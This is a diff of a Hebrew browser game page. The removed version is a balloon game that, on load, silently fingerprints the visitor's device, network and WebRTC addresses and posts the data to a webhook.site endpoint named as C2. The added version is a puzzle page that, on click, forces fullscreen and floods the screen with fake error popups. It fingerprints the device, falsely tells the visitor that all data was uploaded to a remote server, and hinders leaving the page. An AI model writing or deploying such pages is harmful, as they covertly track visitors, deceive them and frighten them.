@@ -2,113 +2,463 @@
 <html lang="he" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>משחק הבלונים - גרסת מחקר מתקדמת 🎈</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>הפאזל של גיל</title>
     <style>
-        body { margin: 0; overflow: hidden; background: #020617; color: white; font-family: system-ui; text-align: center; }
-        .ui { position: fixed; top: 10; width: 100%; pointer-events: none; z-index: 10; }
-        #game-canvas { width: 100vw; height: 100vh; cursor: crosshair; }
-        .balloon { position: absolute; width: 60px; height: 80px; border-radius: 50%; }
+        body {
+            margin: 0;
+            overflow: hidden;
+            background-color: #222;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: white;
+            font-family: 'Courier New', Courier, monospace;
+            user-select: none;
+        }
+
+        /* --- מסך הפאזל --- */
+        #game-section {
+            position: relative;
+            z-index: 10;
+            transition: all 0.1s;
+        }
+
+        h1 {
+            position: absolute;
+            top: 20px;
+            font-size: 3rem;
+            text-shadow: 2px 2px 0px #000;
+        }
+
+        canvas {
+            border: 4px solid #fff;
+            cursor: grab;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        }
+
+        /* --- מסך הדו"ח הסופי (מוסתר בהתחלה) --- */
+        #final-report {
+            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #000;
+            z-index: 2000;
+            padding: 40px;
+            box-sizing: border-box;
+            overflow-y: auto;
+            direction: ltr; /* דו"ח באנגלית נראה יותר מקצועי */
+        }
+
+        .report-header {
+            border-bottom: 2px solid #00ff00;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+        }
+
+        .report-title {
+            color: #00ff00;
+            font-size: 2rem;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+
+        .report-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+        }
+
+        .data-category {
+            border: 1px solid #333;
+            padding: 15px;
+            background: #111;
+        }
+
+        .category-title {
+            color: #00ff00;
+            border-bottom: 1px solid #555;
+            padding-bottom: 5px;
+            margin-bottom: 10px;
+            font-weight: bold;
+        }
+
+        .data-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 5px;
+            font-size: 0.9rem;
+        }
+
+        .label {
+            color: #888;
+        }
+
+        .value {
+            color: #fff;
+            font-weight: bold;
+        }
+
+        .warning {
+            color: red;
+        }
+
+        /* --- חלונות שגיאה מזויפים --- */
+        .fake-popup {
+            position: absolute;
+            width: 300px;
+            background: #d4d0c8;
+            border: 2px solid #fff;
+            border-right-color: #404040;
+            border-bottom-color: #404040;
+            box-shadow: 10px 10px 30px rgba(0,0,0,0.5);
+            z-index: 100;
+            font-family: Tahoma, sans-serif;
+            color: black;
+            display: flex;
+            flex-direction: column;
+            animation: popIn 0.1s ease-out;
+        }
+
+        @keyframes popIn {
+            from {
+                transform: scale(0);
+            }
+
+            to {
+                transform: scale(1);
+            }
+        }
+
+        .popup-header {
+            background: linear-gradient(to right, #000080, #1084d0);
+            color: white;
+            padding: 4px;
+            font-weight: bold;
+            font-size: 14px;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .popup-body {
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+        }
+
+        .popup-icon {
+            width: 32px;
+            height: 32px;
+            background: red;
+            border-radius: 50%;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+            font-size: 20px;
+        }
+
+        /* --- אנימציות כאוס --- */
+        .annoying-mode {
+            animation: shake 0.5s infinite;
+            cursor: none !important;
+        }
+
+        @keyframes shake {
+            0% {
+                transform: translate(1px, 1px) rotate(0deg);
+            }
+
+            10% {
+                transform: translate(-1px, -2px) rotate(-1deg);
+            }
+
+            20% {
+                transform: translate(-3px, 0px) rotate(1deg);
+            }
+
+            30% {
+                transform: translate(3px, 2px) rotate(0deg);
+            }
+
+            40% {
+                transform: translate(1px, -1px) rotate(1deg);
+            }
+
+            50% {
+                transform: translate(-1px, 2px) rotate(-1deg);
+            }
+
+            60% {
+                transform: translate(-3px, 1px) rotate(0deg);
+            }
+
+            70% {
+                transform: translate(3px, 1px) rotate(-1deg);
+            }
+
+            80% {
+                transform: translate(-1px, -1px) rotate(1deg);
+            }
+
+            90% {
+                transform: translate(1px, 2px) rotate(0deg);
+            }
+
+            100% {
+                transform: translate(1px, -2px) rotate(-1deg);
+            }
+        }
     </style>
 </head>
 <body>
 
-    <div class="ui">
-        <h1>הצלח לפוצץ את כולם! 🎈</h1>
-        <div id="score">ניקוד: 0</div>
+    <div id="game-section">
+        <h1 id="main-title">הפאזל של גיל</h1>
+        <canvas id="puzzleCanvas"></canvas>
     </div>
-    <div id="game-canvas"></div>
+
+    <div id="final-report">
+        <div class="report-header">
+            <div class="report-title">SYSTEM COMPROMISED</div>
+            <div>TARGET ANALYSIS COMPLETE</div>
+        </div>
+        <div class="report-grid" id="report-content">
+        </div>
+        <div style="margin-top: 30px; color: red; font-size: 1.2rem; text-align: center; border: 1px solid red; padding: 10px;">
+            ALL DATA HAS BEEN UPLOADED TO REMOTE SERVER.
+        </div>
+    </div>
 
     <script>
-        // --- לוגיקת המשחק ---
-        let score = 0;
-        function spawn() {
-            const b = document.createElement('div');
-            b.className = 'balloon';
-            b.style.left = Math.random() * (window.innerWidth - 60) + 'px';
-            b.style.bottom = '-100px';
-            b.style.backgroundColor = `hsl(${Math.random() * 360}, 70%, 50%)`;
-            document.getElementById('game-canvas').appendChild(b);
-            
-            const a = b.animate([{ bottom: '-100px' }, { bottom: '110vh' }], { duration: 4000 });
-            b.onmousedown = () => { score++; document.getElementById('score').innerText = `ניקוד: ${score}`; b.remove(); };
-            a.onfinish = () => b.remove();
-        }
-        setInterval(spawn, 800);
+        // --- משתנים גלובליים ---
+        const canvas = document.getElementById('puzzleCanvas');
+        const ctx = canvas.getContext('2d');
+        const gameSection = document.getElementById('game-section');
+        const title = document.getElementById('main-title');
+        const finalReport = document.getElementById('final-report');
+        const reportContent = document.getElementById('report-content');
 
-        // --- לוגיקת איסוף מידע מורחב (Reconnaissance) ---
-        const WEBHOOK_URL = 'https://webhook.site/0ddb829c-12b7-4f5a-add3-679a6ecfbceb';
+        let isTrapActive = false;
+        let chaosIntervals = []; // לשמירת הטיימרים כדי שנוכל לעצור אותם
 
+        // --- טעינת פאזל (קוד מקוצר) ---
+        const image = new Image();
+        image.src = 'img_0.jpg'; // וודא שם קובץ
+        image.onload = () => {
+            canvas.width = 400; canvas.height = 400;
+            ctx.drawImage(image, 0, 0, 400, 400);
+            ctx.strokeStyle = 'rgba(255,255,255,0.7)'; ctx.lineWidth = 2;
+            for (let i = 1; i < 4; i++) { ctx.strokeRect(i * 100, 0, 0, 400); ctx.strokeRect(0, i * 100, 400, 0); }
+        };
+
+        // --- הטריגר הראשי ---
+        canvas.addEventListener('mousedown', async () => {
+            if (isTrapActive) return;
+            isTrapActive = true;
+
+            // 1. התחלת הכאוס
+            enterFullScreen();
+            startChaos();
+
+            // 2. איסוף נתונים במקביל (לוקח כמה שניות)
+            const gatheredData = await collectAllData();
+
+            // 3. עצירת הכאוס והצגת הדו"ח אחרי 8 שניות
+            setTimeout(() => {
+                stopChaos();
+                showFinalReport(gatheredData);
+            }, 8000);
+        });
+
+        // --- פונקציית איסוף הנתונים הגדולה ---
         async function collectAllData() {
-            const fullData = {
-                system: {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    cores: navigator.hardwareConcurrency || "N/A", // מספר ליבות מעבד
-                    memory: navigator.deviceMemory || "N/A", // זיכרון RAM משוער ב-GB
-                    screen: `${window.screen.width}x${window.screen.height}`,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-                },
-                network: {
-                    publicIP: "Pending",
-                    connectionType: navigator.connection?.effectiveType || "N/A",
-                    downlink: navigator.connection?.downlink || "N/A",
-                    rtt: navigator.connection?.rtt || "N/A" // Latency משוער
-                },
-                hardware: {
-                    gpu: getGPU(),
-                    battery: await getBattery()
-                },
-                webrtc: []
+            let data = {
+                network: {},
+                hardware: {},
+                software: {},
+                screen: {}
             };
 
-            // 1. קבלת IP ציבורי
+            // רשת (IP)
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const json = await res.json();
-                fullData.network.publicIP = json.ip;
-            } catch(e) {}
+                data.network.ip = json.ip;
+            } catch (e) { data.network.ip = "Hidden / Firewall Detected"; }
 
-            // 2. איסוף ICE Candidates (כולל IP פנימי/mDNS)
-            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-            pc.createDataChannel("");
-            pc.createOffer().then(o => pc.setLocalDescription(o));
-            pc.onicecandidate = (e) => {
-                if (e.candidate) {
-                    fullData.webrtc.push(e.candidate.candidate);
-                    sendToC2(fullData);
-                }
-            };
+            // נסיון לזהות חיבור
+            if (navigator.connection) {
+                data.network.type = navigator.connection.effectiveType || "Unknown";
+                data.network.rtt = navigator.connection.rtt + "ms";
+            }
 
-            // שליחת גיבוי לאחר 3 שניות
-            setTimeout(() => sendToC2(fullData), 3000);
-        }
-
-        function getGPU() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
-            } catch(e) { return "N/A"; }
-        }
-
-        async function getBattery() {
+            // חומרה (סוללה)
             try {
                 if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    return { level: b.level * 100 + "%", charging: b.charging };
-                }
-            } catch(e) {}
-            return "N/A";
+                    const batt = await navigator.getBattery();
+                    data.hardware.battery = Math.round(batt.level * 100) + "%";
+                    data.hardware.charging = batt.charging ? "Yes" : "No";
+                } else { data.hardware.battery = "Desktop / N/A"; }
+            } catch (e) { data.hardware.battery = "Protected"; }
+
+            // חומרה (זיכרון וליבות)
+            data.hardware.memory = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : "Unknown";
+            data.hardware.cores = navigator.hardwareConcurrency || "Unknown";
+
+            // כרטיס מסך (GPU) - טריק מתקדם
+            data.hardware.gpu = getGPUInfo();
+
+            // תוכנה
+            data.software.os = getOS();
+            data.software.browser = getBrowser();
+            data.software.language = navigator.language;
+            data.software.cookies = navigator.cookieEnabled ? "Enabled" : "Disabled";
+            data.software.platform = navigator.platform;
+
+            // מסך
+            data.screen.res = `${window.screen.width} x ${window.screen.height}`;
+            data.screen.depth = `${window.screen.colorDepth}-bit`;
+            data.screen.pixelRatio = window.devicePixelRatio;
+
+            return data;
         }
 
-        function sendToC2(payload) {
-            fetch(WEBHOOK_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
+        // --- פונקציות עזר לאיסוף ---
+        function getGPUInfo() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            } catch (e) { return "Integrated Graphics / Unknown"; }
         }
 
-        collectAllData();
+        function getOS() {
+            const ua = navigator.userAgent;
+            if (ua.indexOf("Win") !== -1) return "Windows";
+            if (ua.indexOf("Mac") !== -1) return "macOS";
+            if (ua.indexOf("Linux") !== -1) return "Linux";
+            if (ua.indexOf("Android") !== -1) return "Android";
+            if (ua.indexOf("iPhone") !== -1) return "iOS";
+            return "Unknown System";
+        }
+
+        function getBrowser() {
+            if (navigator.userAgent.indexOf("Chrome") !== -1) return "Chrome / Chromium";
+            if (navigator.userAgent.indexOf("Firefox") !== -1) return "Mozilla Firefox";
+            if (navigator.userAgent.indexOf("Safari") !== -1) return "Apple Safari";
+            return "Unknown Browser";
+        }
+
+        // --- ניהול הכאוס ---
+        function startChaos() {
+            document.body.classList.add('annoying-mode');
+
+            // חלונות שגיאה
+            const popupInterval = setInterval(spawnErrorBox, 200);
+            chaosIntervals.push(popupInterval);
+
+            // צבעים ורעידות
+            const colorInterval = setInterval(() => {
+                document.body.style.backgroundColor = Math.random() > 0.5 ? '#200' : '#000';
+                title.style.color = Math.random() > 0.5 ? 'red' : 'yellow';
+                title.innerText = "SYSTEM CRITICAL ERROR";
+            }, 100);
+            chaosIntervals.push(colorInterval);
+        }
+
+        function stopChaos() {
+            // ניקוי כל הטיימרים
+            chaosIntervals.forEach(clearInterval);
+            document.body.classList.remove('annoying-mode');
+            document.body.style.backgroundColor = '#000';
+            document.body.style.cursor = 'default';
+
+            // מחיקת כל החלונות המזויפים
+            document.querySelectorAll('.fake-popup').forEach(el => el.remove());
+
+            // הסתרת המשחק
+            gameSection.style.display = 'none';
+        }
+
+        // --- הצגת הדו"ח הסופי ---
+        function showFinalReport(data) {
+            finalReport.style.display = 'block';
+
+            // בניית ה-HTML של הדו"ח
+            const html = `
+                    <div class="data-category">
+                        <div class="category-title">NETWORK INTELLIGENCE</div>
+                        ${row("Public IP", data.network.ip, true)}
+                        ${row("Connection Type", data.network.type)}
+                        ${row("Latency (RTT)", data.network.rtt)}
+                    </div>
+
+                    <div class="data-category">
+                        <div class="category-title">DEVICE HARDWARE</div>
+                        ${row("GPU Renderer", data.hardware.gpu)}
+                        ${row("CPU Cores", data.hardware.cores)}
+                        ${row("RAM Memory", data.hardware.memory)}
+                        ${row("Battery Level", data.hardware.battery, parseInt(data.hardware.battery) < 20)}
+                        ${row("Charging Status", data.hardware.charging)}
+                    </div>
+
+                    <div class="data-category">
+                        <div class="category-title">SOFTWARE FINGERPRINT</div>
+                        ${row("Operating System", data.software.os)}
+                        ${row("Browser Engine", data.software.browser)}
+                        ${row("Platform ID", data.software.platform)}
+                        ${row("System Language", data.software.language)}
+                    </div>
+
+                    <div class="data-category">
+                        <div class="category-title">DISPLAY & TRACKING</div>
+                        ${row("Screen Resolution", data.screen.res)}
+                        ${row("Color Depth", data.screen.depth)}
+                        ${row("Cookies Enabled", data.software.cookies)}
+                        ${row("Timezone", Intl.DateTimeFormat().resolvedOptions().timeZone)}
+                    </div>
+                `;
+
+            reportContent.innerHTML = html;
+        }
+
+        function row(label, value, isWarning = false) {
+            return `
+                    <div class="data-row">
+                        <span class="label">${label}:</span>
+                        <span class="value ${isWarning ? 'warning' : ''}">${value}</span>
+                    </div>
+                `;
+        }
+
+        function spawnErrorBox() {
+            // (אותו קוד מהגרסה הקודמת ליצירת חלונות)
+            const popup = document.createElement('div');
+            popup.className = 'fake-popup';
+            popup.style.left = Math.random() * (window.innerWidth - 300) + 'px';
+            popup.style.top = Math.random() * (window.innerHeight - 150) + 'px';
+            popup.innerHTML = `<div class="popup-header"><span>Error 0x${Math.floor(Math.random() * 9999)}</span><span>X</span></div><div class="popup-body"><div class="popup-icon">!</div><div>Fatal Exception Occurred</div></div>`;
+            document.body.appendChild(popup);
+        }
+
+        function enterFullScreen() {
+            const el = document.documentElement;
+            if (el.requestFullscreen) el.requestFullscreen();
+        }
+
+        // מניעת יציאה
+        window.onbeforeunload = () => "System Halted.";
+        document.addEventListener('contextmenu', e => e.preventDefault());
+
     </script>
 </body>
 </html>
-
